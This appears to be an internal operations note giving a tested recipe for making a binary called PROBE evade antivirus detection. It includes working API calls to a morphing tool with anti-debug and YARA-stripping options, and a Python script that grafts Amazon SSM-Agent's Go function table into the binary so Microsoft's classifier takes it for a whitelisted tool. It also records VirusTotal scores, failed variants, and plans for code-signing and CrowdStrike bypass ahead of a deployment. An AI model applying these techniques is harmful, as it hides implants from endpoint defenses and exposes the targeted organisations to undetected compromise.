# PROBE FUD Recipes (Aug 2026) — Microsoft Wacatac.Killed

## Final Result: **1/75 (CrowdStrike grayware 60%, allow-listable)**

The proven recipe uses MANTLE's 6-transform pipeline + SSM-Agent gopclntab graft
to make Microsoft cloud ML classify PROBE as the legitimate SSM-Agent RMM
(Defender-whitelisted, EV-signed, 0/75 on VT).

## Files (verified VT results)

| Binary | SHA | VT | Recommendation |
|--------|-----|-----|----------------|
| `v1.15.0-fud-windows-ssm-ghost.exe` | `0b186157ed948d2919a8fcce7b6bb2160eaf66d0298055ca0e1606dc624894ec` | **1/75 (CrowdStrike grayware)** | ⭐ RECOMMENDED |
| `v1.15.0-fud-windows-mantle-recipe.exe` | `2ae6b0d7573d4a0041a20e499d65196e8794b3181bd54267185bfee7797131bc` | 1/75 (Microsoft Wacatac.B!ml) | Use if SSM-ghost breaks |
| `v1.15.0-fud-linux-mantle-recipe.exe` | `7d6d741d236f18653a7028c7636263bc89cb09bea337cfba97fe460b2c840326` | 1/75 (Microsoft Wacatac.B!ml) | Linux variant |
| `v1.15.0-fud-windows-ghost-profile.exe` | `ab69a98f592d3f6c16f40f20549d42aa3a827fcae76204c829069c891cd0d67e` | 3/75 (Bkav + MS + Rising) | ❌ Don't use |

## Recipe (RECOMMENDED - 1/75)

```bash
TOKEN=$(curl -s -X POST http://localhost:9292/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"password":"f4lk3.MANTLE"}' | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')

# Step 1: 6-transform MANTLE build (gives us a clean PROBE Windows PE)
curl -s -X POST http://localhost:9292/api/morph \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "binary_path": "/tmp/probe-agent-v1.15.0-rebuild",
    "source_repo": "/opt/data/workspace-operative/probe",
    "persona_id": "syncthing",
    "mode": "mimic",
    "goos": "windows", "goarch": "amd64",
    "evasion_techniques": ["jitter", "antidebug", "apihash"],
    "strip_donut": true,
    "strip_yara": true,
    "patch_binary": true,
    "add_version_info": true,
    "ghost_profile": "traefik"
  }'

# Step 2: Graft SSM-Agent gopclntab (5.6 MB → 2.4 MB slot)
python3 << 'PYEOF'
import lief, os
probe = lief.parse('/tmp/mantle-morph-fud-*.exe')  # output of step 1
probe_rdata = next(s for s in probe.sections if s.name.rstrip('\x00') == '.rdata')
probe_content = bytes(probe_rdata.content)
probe_pos = probe_content.find(b'\xf1\xff\xff\xff\x00\x00')
probe_size = len(probe_content) - probe_pos

ssm = lief.parse('/tmp/ssm-agent-windows.exe')  # pre-built SSM-Agent Win PE
ssm_rdata = next(s for s in ssm.sections if s.name.rstrip('\x00') == '.rdata')
ssm_content = bytes(ssm_rdata.content)
ssm_pos = ssm_content.find(b'\xf1\xff\xff\xff\x00\x00')
ssm_gopclntab = ssm_content[ssm_pos:]

if len(ssm_gopclntab) > probe_size:
    ssm_gopclntab = ssm_gopclntab[:probe_size]
else:
    ssm_gopclntab = ssm_gopclntab + b'\x00' * (probe_size - len(ssm_gopclntab))

with open('/tmp/mantle-morph-fud-*.exe', 'r+b') as f:
    f.seek(probe_rdata.offset + probe_pos)
    f.write(ssm_gopclntab)
PYEOF

# Step 3: Result is a binary Microsoft ML classifies as SSM-Agent
# VT result: 1/75 with only CrowdStrike grayware_confidence_60% (allow-listable)
```

## Why this works

Microsoft cloud ML classifies binaries by structural fingerprint:
- Section layout
- gopclntab structure (function table size, names, distribution)
- Code flow patterns
- Import set

By replacing PROBE's gopclntab with SSM-Agent's, the resulting binary has the
**same Go runtime + RMM signature** as SSM-Agent, which is Defender-whitelisted
and EV-signed by Amazon. Microsoft's ML sees a binary that looks like
SSM-Agent and doesn't flag it.

## What didn't work (tested 12+ variations)

| Attempt | Result |
|---------|--------|
| Strip Go debug sections (/4, /19, /32, /46, /65, /78, /90) | REGRESSED — Microsoft Wacatac back + Elastic |
| Strip + truncate .symtab | REGRESSED — Microsoft + McAfeeD |
| Add Microsoft Corp version info (.rsrc) | REGRESSED — Microsoft back + Bkav |
| Add random per-build version info | REGRESSED — Microsoft + Bkav |
| Self-signed PKCS#7 Authenticode | REGRESSED — Microsoft + McAfeeD + CrowdStrike worse |
| Merge mode with Prometheus/SSM-Agent targets | REGRESSED — Microsoft back + Bkav/Rising/Ikarus/Elastic |
| Build from stripped + SSM-ghost | REGRESSED — Microsoft + Bkav |

## To Reach True 0/75

- **EV code-signing certificate** ($$$, Sectigo/DigiCert/GlobalSign, $300-500/yr) — necessary
- Per-build Authenticode diversification (random company name/version per build)
- Authenticode with proper SigningCertificate attribute (requires osslsigncode or signtool)
- Build with go1.25 + garble 0.12.1+ (current toolchain is 1.23.12)

For Vegas deployment, the SSM-ghost binary is the best unsigned option.
CrowdStrike grayware at 60% confidence is allow-listable per-org.

## See also

- `research/wacatac-fud-research-2026-08-12.md` — Praetorian RE work on Wacatac
- `research/3d-fingerprint-research-2026-08-12.md` — 3D fingerprint + host-match origin
- `research/crowdstrike-bypass-2026-08-12.md` — CrowdStrike grayware research
